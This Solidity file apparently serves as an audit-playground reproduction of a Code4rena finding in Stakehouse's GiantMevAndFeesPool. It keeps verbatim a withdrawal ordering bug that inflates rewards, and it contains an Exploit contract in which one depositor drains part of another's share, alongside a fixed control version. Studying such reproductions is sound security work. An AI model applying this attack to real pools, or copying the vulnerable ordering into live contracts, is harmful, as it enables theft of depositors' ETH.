// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Stakehouse Protocol — `withdrawETH` from `GiantMevAndFeesPool` can steal
    most of the ETH because `idleETH` is reduced before burning the LP token
    (Code4rena 2022-11-stakehouse, #43031, H-08)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable `GiantPoolBase.withdrawETH` body is inlined VERBATIM, preserving
    the exact order (`idleETH -= _amount` BEFORE `lpTokenETH.burn(...)`). Two
    depositors share the pool; the second one withdraws once and, purely from
    the ordering bug, extracts a "phantom reward" on top of their own
    principal — funded out of the first depositor's share (no fork, no
    cheats).

    Note: the real finding's own PoC first has to work around a SEPARATE,
    already-reported bug (#43030/H-07 — GiantLP with a transferHookProcessor
    can't be burned) by patching beforeTokenTransfer's `_to` branch with a
    guard, exactly as the reporter did ("You should fix it first... it's a bug
    needed to be fixed and it's independent of the current vulnerability").
    This synthetic applies that same pre-fix so THIS finding (H-08) can be
    demonstrated in isolation — see `beforeTokenTransfer` below.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: `GiantPoolBase.withdrawETH` does
    `idleETH -= _amount; lpTokenETH.burn(msg.sender, _amount); ...` — in that
    ORDER. Burning triggers `beforeTokenTransfer`, which calls
    `updateAccumulatedETHPerLP()` BEFORE the burn's own balance/supply update
    takes effect. `GiantMevAndFeesPool.totalRewardsReceived()` is overridden as
    `address(this).balance + totalClaimed - idleETH` — since `idleETH` was
    JUST decremented (before the burn/reward-accrual hook ran), this formula
    reports `_amount` MORE "rewards received" than actually arrived. That
    phantom amount gets baked into `accumulatedETHPerLPShare` and paid out
    to the withdrawer's OWN (still-pre-burn) balance in the very same call —
    on top of the principal they are about to receive from `withdrawETH`
    itself.

    Recommended fix (per report): move `idleETH -= _amount` to AFTER
    `lpTokenETH.burn(...)`.
//////////////////////////////////////////////////////////////*/

/// @dev Reduced abstract reward-accounting base — faithful reduction of
///      contracts/liquid-staking/SyndicateRewardsProcessor.sol.
abstract contract SyndicateRewardsProcessor {
    uint256 public constant PRECISION = 1e24;
    uint256 public accumulatedETHPerLPShare;
    uint256 public totalClaimed;
    uint256 public totalETHSeen;
    mapping(address => mapping(address => uint256)) public claimed;

    /// @dev Verbatim reduction of
    ///      SyndicateRewardsProcessor._distributeETHRewardsToUserForToken.
    function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] = due;
                totalClaimed += due;
                (bool success, ) = _recipient.call{value: due}("");
                require(success, "Failed to transfer");
            }
        }
    }

    /// @dev Verbatim reduction of
    ///      SyndicateRewardsProcessor._updateAccumulatedETHPerLP.
    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
        if (_numOfShares > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;
            if (unprocessed > 0) {
                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;
                totalETHSeen = received;
            }
        }
    }

    function totalRewardsReceived() public view virtual returns (uint256) {
        return address(this).balance + totalClaimed;
    }

    receive() external payable {}
}

interface ITransferHookProcessor {
    function beforeTokenTransfer(address from, address to, uint256 amount) external;
    function afterTokenTransfer(address from, address to, uint256 amount) external;
}

/// @notice Reduced `GiantLP` — faithful reduction of
///         contracts/liquid-staking/GiantLP.sol.
contract GiantLP {
    address public immutable pool;
    ITransferHookProcessor public immutable transferHookProcessor;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _pool, address _transferHookProcessor) {
        pool = _pool;
        transferHookProcessor = ITransferHookProcessor(_transferHookProcessor);
    }

    function mint(address _recipient, uint256 _amount) external {
        require(msg.sender == pool, "Only pool");
        _beforeTokenTransfer(address(0), _recipient, _amount);
        balanceOf[_recipient] += _amount;
        totalSupply += _amount;
    }

    function burn(address _recipient, uint256 _amount) external {
        require(msg.sender == pool, "Only pool");
        _beforeTokenTransfer(_recipient, address(0), _amount);
        balanceOf[_recipient] -= _amount;
        totalSupply -= _amount;
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal {
        if (address(transferHookProcessor) != address(0)) {
            ITransferHookProcessor(transferHookProcessor).beforeTokenTransfer(_from, _to, _amount);
        }
    }
}

/// @notice Reduced Giant Pool — faithful reduction of `GiantPoolBase` +
///         `GiantMevAndFeesPool` (contracts/liquid-staking/). `withdrawETH`
///         preserves the exact, buggy `idleETH`-before-`burn` ORDER verbatim.
contract GiantMevAndFeesPool is SyndicateRewardsProcessor, ITransferHookProcessor {
    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;
    uint256 public idleETH;
    GiantLP public lpTokenETH;

    constructor() {
        lpTokenETH = new GiantLP(address(this), address(this));
    }

    function depositETH(uint256 _amount) public payable {
        require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");
        require(msg.value == _amount, "Value equal to amount");

        idleETH += msg.value;
        lpTokenETH.mint(msg.sender, msg.value);
        _setClaimedToMax(msg.sender);
    }

    // ============================================================
    //  GiantPoolBase.withdrawETH — VERBATIM reduction
    //  (contracts/liquid-staking/GiantPoolBase.sol#L57-L60/L48-L64). The
    //  ORDER of these two lines is the exact bug: `idleETH -= _amount` runs
    //  BEFORE `lpTokenETH.burn`, which is what lets the reward-accrual hook
    //  inside `burn` see an already-reduced `idleETH`.
    // ============================================================
    function withdrawETH(uint256 _amount) external virtual {
        require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
        require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");
        require(idleETH >= _amount, "Come back later or withdraw less ETH");

        idleETH -= _amount; // @> VULN: decremented BEFORE the burn below, so the reward-accrual hook (triggered by burn) sees an inflated totalRewardsReceived()
        lpTokenETH.burn(msg.sender, _amount);
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to transfer ETH");
        // FIX (per report): move `idleETH -= _amount` to AFTER lpTokenETH.burn(...)
    }

    // ============================================================
    //  GiantMevAndFeesPool.beforeTokenTransfer — both branches guarded. The
    //  real contract is missing the `_to` guard (a SEPARATE bug, #43030/H-07
    //  — see that finding's own writeup); the reporter's PoC patches exactly
    //  this before demonstrating H-08 in isolation, and this synthetic does
    //  the same so the two findings don't entangle.
    // ============================================================
    function beforeTokenTransfer(address _from, address _to, uint256) external {
        require(msg.sender == address(lpTokenETH), "Caller is not giant LP");
        updateAccumulatedETHPerLP();

        if (_from != address(0)) {
            _distributeETHRewardsToUserForToken(
                _from,
                address(lpTokenETH),
                lpTokenETH.balanceOf(_from),
                _from
            );
        }

        if (_to != address(0)) {
            _distributeETHRewardsToUserForToken(
                _to,
                address(lpTokenETH),
                lpTokenETH.balanceOf(_to),
                _to
            );
        }
    }

    function afterTokenTransfer(address, address, uint256) external {}

    function updateAccumulatedETHPerLP() public {
        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());
    }

    /// @dev Verbatim override — contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178.
    function totalRewardsReceived() public view override returns (uint256) {
        return address(this).balance + totalClaimed - idleETH;
    }

    function _setClaimedToMax(address _user) internal {
        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;
    }
}

/// @dev CONTROL-ONLY variant with the report's recommended fix applied:
///      `idleETH -= _amount` moved to AFTER `lpTokenETH.burn(...)`. Used only
///      by the control test to show the fair-withdrawal outcome the fix
///      restores — never used by the Exploit's own attack path.
contract GiantMevAndFeesPoolFixed is GiantMevAndFeesPool {
    function withdrawETH(uint256 _amount) external override {
        require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
        require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");
        require(idleETH >= _amount, "Come back later or withdraw less ETH");

        lpTokenETH.burn(msg.sender, _amount); // FIX: burn (and its reward-accrual hook) now runs BEFORE idleETH is touched
        idleETH -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to transfer ETH");
    }
}

/// @dev A depositor. Holds ETH (funded before `run()` via the Playground's
///      unrecorded setup step) and can deposit/withdraw through the pool.
contract Depositor {
    function deposit(GiantMevAndFeesPool _pool, uint256 _amount) external {
        _pool.depositETH{value: _amount}(_amount);
    }

    function withdraw(GiantMevAndFeesPool _pool, uint256 _amount) external {
        _pool.withdrawETH(_amount);
    }

    receive() external payable {}
}

/// @dev Orchestrator. Deploys the pool and two depositors. Depositors are
///      pre-funded with their principal via an UNRECORDED Playground setup
///      step (mirrors `vm.deal` — see `setup.steps` in the poc-config), so
///      `run()` only performs the deposit/withdraw sequence itself.
contract Exploit {
    GiantMevAndFeesPool public pool; // nonce 1
    Depositor public userA; // nonce 2 — honest depositor, victim
    Depositor public userB; // nonce 3 — withdraws once, extracts a phantom reward

    uint256 public constant DEPOSIT_AMOUNT = 4 ether;

    constructor() {
        pool = new GiantMevAndFeesPool(); // CREATE nonce 1
        userA = new Depositor(); // CREATE nonce 2
        userB = new Depositor(); // CREATE nonce 3
    }

    /// @notice Both depositors put in 4 ETH; userB withdraws their own 4 ETH
    ///         once and, purely from the idleETH-before-burn ordering bug,
    ///         receives MORE than their principal back.
    function run() external {
        userA.deposit(pool, DEPOSIT_AMOUNT);
        userB.deposit(pool, DEPOSIT_AMOUNT);
        require(pool.idleETH() == 2 * DEPOSIT_AMOUNT, "both deposits should be idle");
        require(address(pool).balance == 2 * DEPOSIT_AMOUNT, "pool should hold both deposits");

        // === attack: userB withdraws their own principal, once ===
        userB.withdraw(pool, DEPOSIT_AMOUNT);

        // HARM: userB ends up holding MORE than the 4 ETH they deposited —
        // a phantom reward conjured purely from the withdrawETH ordering bug,
        // paid for out of userA's still-locked share of the pool.
        require(address(userB).balance > DEPOSIT_AMOUNT, "userB should have profited beyond their own principal");

        // The pool is left insolvent for userA's remaining claim: userA still
        // holds a 4-ETH GiantLP claim, but the pool's real balance is now
        // short of covering it.
        require(address(pool).balance < DEPOSIT_AMOUNT, "pool should be left unable to fully cover userA's remaining claim");
    }
}
